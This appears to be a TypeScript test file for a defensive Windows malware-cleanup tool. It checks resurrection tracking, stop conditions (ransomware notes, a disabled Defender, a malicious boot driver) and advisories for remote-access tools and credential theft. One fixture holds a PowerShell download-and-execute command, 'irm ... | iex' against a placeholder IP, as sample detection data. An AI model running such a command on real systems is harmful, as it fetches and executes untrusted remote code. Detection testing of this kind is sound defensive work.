import { describe, it } from 'node:test';
import assert from 'node:assert/strict';
import { loadRules } from '../src/data-loader.js';
import { evaluateAdvisoriesAndStops } from '../src/scoring/advisories.js';
import { evaluateVerification } from '../src/commands/verify.js';
import type { CollectedItem, Finding, Manifest, PreflightResult } from '../src/types.js';

function makePreflight(overrides: Partial<PreflightResult> = {}): PreflightResult {
  return {
    timestamp: '2026-11-21T10:00:00Z',
    tool_version: '0.1.0',
    platform: 'windows',
    hostname: 'TESTBOX',
    os_version: 'Windows 11 Pro',
    os_build: '26100',
    arch: 'x64',
    elevated: true,
    pending_reboot: false,
    pending_reboot_reasons: [],
    free_disk_bytes: 100_000_000_000,
    domain_joined: false,
    mdm_enrolled: false,
    av_products: [
      {
        display_name: 'Windows Defender',
        product_state: 397568,
        enabled: true,
        up_to_date: true,
      },
    ],
    defender: {
      available: true,
      active: true,
      mode: 'active',
      realtime_enabled: true,
      tamper_protected: true,
    },
    collectors_requested: ['autoruns', 'tasks'],
    collectors_skipped: [],
    collectors_partial: [],
    ransomware_indicators: [],
    ...overrides,
  };
}

describe('Verify, Resurrection Tracking, Stop Conditions & Advisories (Section 4 & 11)', () => {
  it('flags resurrected item on 1st verify and triggers STOP CONDITION on 2nd resurrection', () => {
    const preflight = makePreflight();
    const finding: Finding = {
      id: 'f-0001',
      collector: 'autoruns',
      kind: 'autorun_registry',
      location: 'HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\Stubborn',
      facts: { target_path: 'C:\\Users\\alice\\AppData\\Roaming\\bad\\stubborn.exe' },
      untrusted: { name: 'Stubborn' },
      signals: ['unsigned', 'user_writable_path'],
      score: 85,
      tier: 'malicious',
      proposed_action: 'disable_autorun',
      protected: false,
    };
    const manifest: Manifest = {
      session_id: 's1',
      created_at: '2026-11-21T10:00:00Z',
      entries: [
        {
          action_id: 'act-0001',
          finding_id: 'f-0001',
          action: 'disable_autorun',
          location: finding.location,
          timestamp: '2026-11-21T10:05:00Z',
          completed_at: '2026-11-21T10:05:01Z',
          backup_path: '/tmp/b.reg',
          backup_sha256: 'abc',
          inverse: { type: 'disable_autorun', reversible: true, description: 'restore', params: {} },
          status: 'succeeded',
        },
      ],
    };

    const reappearedItem: CollectedItem = {
      collector: 'autoruns',
      kind: 'autorun_registry',
      location: finding.location,
      facts: { target_path: 'C:\\Users\\alice\\AppData\\Roaming\\bad\\stubborn.exe' },
      untrusted: { name: 'Stubborn' },
    };

    // 1st verify (before reboot): resurrected once, no stop condition yet, reboot_required = true
    const v1 = evaluateVerification({
      sessionId: 's1',
      preflight,
      findings: [finding],
      manifest,
      currentItems: [reappearedItem],
      bootTimeMs: Date.parse('2026-11-21T08:00:00Z'),
    });
    assert.equal(v1.resurrected_count, 1);
    assert.equal(v1.items[0].status, 'resurrected');
    assert.equal(v1.items[0].resurrection_count, 1);
    assert.equal(v1.reboot_required, true);
    assert.equal(v1.stop_conditions.length, 0);

    // 2nd verify (after reboot): resurrected a 2nd time -> triggers repeated_resurrection stop condition!
    const v2 = evaluateVerification({
      sessionId: 's1',
      preflight,
      findings: [finding],
      manifest,
      currentItems: [reappearedItem],
      previousVerify: v1,
      bootTimeMs: Date.parse('2026-11-21T11:00:00Z'),
    });
    assert.equal(v2.post_reboot, true);
    assert.equal(v2.items[0].resurrection_count, 2);
    assert.equal(v2.stop_conditions.length, 1);
    assert.equal(v2.stop_conditions[0].kind, 'repeated_resurrection');
  });

  it('triggers stop conditions for ransomware, unrecoverable Defender, and malicious boot-start driver', () => {
    const rules = loadRules();

    // 1. Ransomware note
    const r1 = evaluateAdvisoriesAndStops({
      preflight: makePreflight({ ransomware_indicators: ['Ransom note candidate: C:\\Users\\alice\\Desktop\\README_DECRYPT.txt'] }),
      findings: [],
      rules,
    });
    assert.ok(r1.stopConditions.some((s) => s.kind === 'ransomware_detected'));

    // 2. Defender disabled by policy & stopped with no 3rd-party AV
    const r2 = evaluateAdvisoriesAndStops({
      preflight: makePreflight({
        av_products: [],
        defender: {
          available: false,
          active: false,
          mode: 'disabled',
          disabled_by_policy: true,
          service_status: 'Stopped',
        },
      }),
      findings: [],
      rules,
    });
    assert.ok(r2.stopConditions.some((s) => s.kind === 'defender_unrecoverable'));

    // 3. Boot-start kernel driver scored malicious
    const malDriver: Finding = {
      id: 'f-0009',
      collector: 'services',
      kind: 'kernel_driver',
      location: 'HKLM\\Services\\RootkitDrv',
      facts: { is_kernel_driver: true, is_boot_start: true, sig_status: 'NotSigned' },
      untrusted: { name: 'RootkitDrv' },
      signals: ['defender_hit'],
      score: 100,
      tier: 'malicious',
      proposed_action: 'report_only',
      protected: true,
    };
    const r3 = evaluateAdvisoriesAndStops({
      preflight: makePreflight(),
      findings: [malDriver],
      rules,
    });
    assert.ok(r3.stopConditions.some((s) => s.kind === 'malicious_boot_driver'));
  });

  it('emits credential-theft and unknown remote-access tool advisories without blocking', () => {
    const rules = loadRules();
    const findings: Finding[] = [
      {
        id: 'f-0001',
        collector: 'programs',
        kind: 'installed_program',
        location: 'HKLM\\Uninstall\\AnyDesk',
        facts: { program_tag: 'remote_access_tool', program_tag_name: 'AnyDesk' },
        untrusted: { name: 'AnyDesk' },
        signals: ['remote_access_tool'],
        score: 25,
        tier: 'review',
        proposed_action: 'uninstall_program',
        protected: false,
      },
      {
        id: 'f-0002',
        collector: 'traces',
        kind: 'run_mru',
        location: 'HKCU\\RunMRU\\a',
        facts: { trace_paste_match: true },
        untrusted: { command_line: 'powershell -c "irm http://192.0.2.1/x.ps1 | iex"' },
        signals: ['trace_paste_exec'],
        score: 60,
        tier: 'suspicious',
        proposed_action: 'report_only',
        protected: false,
      },
    ];

    const res = evaluateAdvisoriesAndStops({
      preflight: makePreflight(),
      findings,
      rules,
    });

    assert.equal(res.stopConditions.length, 0);
    assert.ok(res.advisories.some((a) => a.kind === 'remote_access_tool'));
    const credAdv = res.advisories.find((a) => a.kind === 'credential_theft');
    assert.ok(credAdv);
    assert.match(credAdv.message, /DIFFERENT, CLEAN DEVICE/i);
  });
});
